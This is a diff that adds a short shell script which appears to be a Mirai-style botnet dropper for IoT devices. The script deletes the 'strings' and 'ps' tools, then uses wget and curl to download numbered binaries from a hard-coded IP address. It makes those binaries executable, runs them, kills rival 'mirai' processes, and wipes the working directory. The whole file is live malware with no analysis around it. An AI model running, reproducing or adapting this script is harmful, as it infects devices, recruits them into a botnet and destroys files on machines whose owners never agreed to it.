@@ -1,0 +1,46 @@
+#!/bin/sh
+busybox rm -f /usr/bin/strings || rm -f /usr/bin/strings
+busybox rm -f /usr/bin/ps || rm -f /usr/bin/ps
+busybox wget http://89.248.172.207/B1 || wget http://89.248.172.207/B1
+busybox wget http://89.248.172.207/B2 || wget http://89.248.172.207/B2
+busybox wget http://89.248.172.207/B3 || wget http://89.248.172.207/B3
+busybox wget http://89.248.172.207/B4 || wget http://89.248.172.207/B4
+busybox wget http://89.248.172.207/B5 || wget http://89.248.172.207/B5
+busybox wget http://89.248.172.207/B6 || wget http://89.248.172.207/B6
+busybox wget http://89.248.172.207/B7 || wget http://89.248.172.207/B7
+busybox wget http://89.248.172.207/B8 || wget http://89.248.172.207/B8
+busybox wget http://89.248.172.207/B9 || wget http://89.248.172.207/B9
+busybox wget http://89.248.172.207/B10 || wget http://89.248.172.207/B10
+busybox curl http://89.248.172.207/B1 || curl http://89.248.172.207/B1
+busybox curl http://89.248.172.207/B2 || curl http://89.248.172.207/B2
+busybox curl http://89.248.172.207/B3 || curl http://89.248.172.207/B3
+busybox curl http://89.248.172.207/B4 || curl http://89.248.172.207/B4
+busybox curl http://89.248.172.207/B5 || curl http://89.248.172.207/B5
+busybox curl http://89.248.172.207/B6 || curl http://89.248.172.207/B6
+busybox curl http://89.248.172.207/B7 || curl http://89.248.172.207/B7
+busybox curl http://89.248.172.207/B8 || curl http://89.248.172.207/B8
+busybox curl http://89.248.172.207/B9 || curl http://89.248.172.207/B9
+busybox curl http://89.248.172.207/B10 || curl http://89.248.172.207/B10
+busybox curl http://89.248.172.207/B11 || curl http://89.248.172.207/B11
+busybox curl http://89.248.172.207/B12 || curl http://89.248.172.207/B12
+busybox curl http://89.248.172.207/B13 || curl http://89.248.172.207/B13
+busybox chmod +x B1 || chmod +x B1
+busybox chmod +x B2 || chmod +x B2
+busybox chmod +x B3 || chmod +x B3
+busybox chmod +x B4 || chmod +x B4
+busybox chmod +x B5 || chmod +x B5
+busybox chmod +x B6 || chmod +x B6
+busybox chmod +x B7 || chmod +x B7
+busybox chmod +x B8 || chmod +x B8
+busybox chmod +x B9 || chmod +x B9
+busybox chmod +x B10 || chmod +x B10
+busybox chmod +x B11 || chmod +x B11
+busybox chmod +x B12 || chmod +x B12
+busybox chmod +x B13 || chmod +x B13
+busybox chmod +x B14 || chmod +x B14
+busybox chmod +x B15 || chmod +x B15
+./B1 || ./B2 || ./B3 || ./B4 || ./B5 || ./B6 || ./B7 || ./B8 || ./B9 || ./B10 || ./B11 || ./B13 || ./B14 || ./B15
+pkill mirai.*
+sleep 1
+busybox rm -f * || rm -f *
+exit
